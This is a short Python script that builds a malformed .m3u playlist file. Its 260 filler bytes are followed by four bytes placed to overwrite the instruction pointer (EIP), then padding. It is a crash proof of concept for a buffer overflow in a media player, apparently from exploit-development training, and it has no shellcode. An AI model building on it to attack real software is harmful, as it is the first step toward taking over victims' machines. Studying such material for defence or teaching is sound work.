#! /usr/bin/python

junk = "A" * 260
eip = "B" * 4
fill = "C" * (5000-len(junk)-len(eip))

buffer = junk + eip + fill

f=open("exploit.m3u","w")
f.write(buffer);
f.close()
